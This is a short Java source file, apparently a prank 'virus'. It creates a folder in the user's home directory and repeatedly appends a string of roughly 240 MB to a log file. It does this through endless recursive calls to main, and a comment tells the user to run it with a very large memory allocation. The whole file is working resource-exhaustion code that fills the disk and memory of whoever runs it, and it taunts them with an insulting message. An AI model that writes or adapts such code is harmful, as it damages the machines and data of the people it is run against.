import java.io.*;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

public class App {
    public static void main(String[] args) throws Exception {
        String mainPath      = "~/virus_prof";
        String logPath       = "~/virus_prof/log.txt";
        mainPath             = System.getProperty("user.home") + mainPath.substring(1);
        logPath              = System.getProperty("user.home") + logPath.substring(1);
        // System.out.println(mainPath);
        
        //checks if directory and high score file exist. if not, the file will be created
        File dir = new File(mainPath);
        if (!dir.exists()) {
                dir.mkdir();
        }

        // make/append a file that endlessly loops
        // double i = 0.0;
        // while (i < 100000000000000000.0) {
                FileWriter fwriter = new FileWriter(logPath, true);
                PrintWriter print  = new PrintWriter(fwriter);
                String prankstr = "hahahahaha get pranked idiot.";
                for (int i = 0; i < 23; i++) {
                    prankstr += prankstr;
                    System.out.print(i);
                }
                print.println(prankstr);
                
                System.out.println(prankstr);
                print.close(); // Close the PrintWriter object after writing
            // }
            main(new String[]{});
    }
}


/*
 * run the code by typing 
 *          java -Xmx9999m App
 * but replace 9999 with whatever maximum memory allocation you want it to use.
 */